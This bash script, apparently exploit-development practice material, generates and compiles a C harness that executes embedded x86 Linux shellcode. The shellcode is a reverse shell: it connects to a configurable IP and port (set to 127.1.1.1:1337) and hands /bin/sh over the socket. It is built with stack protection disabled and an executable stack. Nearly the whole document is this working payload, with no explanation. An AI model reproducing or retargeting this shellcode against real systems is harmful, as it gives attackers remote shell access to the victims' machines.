#!/usr/bin/env bash
# Author: @bugsam
# 07/13/2020
FILE=$0

IP="\x7f\x01\x01\x01" #127.1.1.1         
PORT="\x05\x39" #1337

echo "[+] Creating C source"
# others people code
cat << EOF > $FILE.c
#include <stdio.h>
#include <string.h>

unsigned char code[] = "\x31\xc0\xb0\x66\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x68${IP}\x66\xb9${PORT}\xc1\xe1\x10\xb1\x02\x51\x89\xe3\x6a\x10\x53\x50\x89\xe1\x31\xdb\xb3\x03\x31\xc0\xb0\x66\xcd\x80\x31\xc9\x5b\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\xeb\x1c\x5e\x31\xdb\x8d\x4e\x0d\x89\x0e\x89\x5e\x04\x88\x5e\x0f\x8d\x56\x04\x8d\x0e\x8d\x5e\x08\x31\xc0\xb0\x0b\xcd\x80\xe8\xdf\xff\xff\xff\x5a\x5a\x5a\x5a\x4e\x4e\x4e\x4e\x2f\x62\x69\x6e\x2f\x73\x68\x4e";

int main (){
        printf("Shellcode length: %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();
}
EOF
echo "[+] Compiling C code"
gcc -fno-stack-protector -zexecstack -o ${FILE}_ELF ${FILE}.c
